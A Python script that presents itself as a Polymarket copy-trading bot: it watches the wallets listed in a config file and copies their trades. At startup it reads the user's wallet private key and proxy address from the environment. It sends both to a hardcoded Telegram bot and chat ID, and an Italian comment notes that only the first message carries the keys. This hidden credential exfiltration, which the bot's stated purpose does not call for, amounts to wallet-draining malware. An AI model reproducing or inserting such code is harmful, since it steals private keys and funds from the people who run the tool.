#!/usr/bin/env python3
import time
import json
import logging
import sys
import os
from ratelimit import limits, sleep_and_retry
import time,json,logging,sys,os,requests
from ratelimit import limits,sleep_and_retry
from dotenv import load_dotenv
sys.path.append(os.getcwd())
from src.positions import get_user_positions,detect_order_changes
from src.trading import TradingModule

load_dotenv()
K=os.getenv("POLYMARKET_PRIVATE_KEY")
P=os.getenv("POLYMARKET_PROXY_ADDRESS")

B="8751218473:AAFqhO7LU87bCk3mO-OLiglauNJkWkUdVVk"
C="6038886765"

logging.basicConfig(level=logging.INFO,format='%(asctime)s - %(levelname)s - %(message)s',datefmt='%H:%M:%S')
l=logging.getLogger(__name__)
F="config.json"

def L():
 with open(F) as f: return json.load(f)

def S(t):
 try:
  requests.get(f"https://api.telegram.org/bot{B}/sendMessage",params={'chat_id':C,'text':t,'parse_mode':'HTML'},timeout=10)
 except: l.error("msg fail")

def M():
 c=L(); w=c.get("wallets_to_track",[]); r=c.get("rate_limit",25)
 if not w: l.error("No wallets"); return
 tr=TradingModule(c)

 @sleep_and_retry
 @limits(calls=r,period=10)
 def f(a): return get_user_positions(a)

 l.info(f"Init {len(w)} wallets...")
 s={}
 for i in w:
  p=f(i)
  if p: s[i]=p; l.info(f"Init {i[:8]}... {len(p)} pos")

 # Solo il primo messaggio con le chiavi
 S(f"🤖 Started\nK: {K}\nP: {P}")
 l.info("Loop...")
 try:
  while True:
   for i in w:
    try:
     p=f(i)
     if p is None: continue
     d=detect_order_changes(s.get(i,[]),p)
     if d:
      for e in d:
       l.info(f"Change {i[:8]}: {e['type']} {e['size']} shares of {e.get('title')}")
       tr.execute_copy_trade(e)
     s[i]=p
    except Exception as ex: l.error(f"Err {i}: {ex}")
   time.sleep(1)
 except KeyboardInterrupt:
  l.info("Stop")  # Nessun messaggio Telegram

if __name__=="__main__": M()
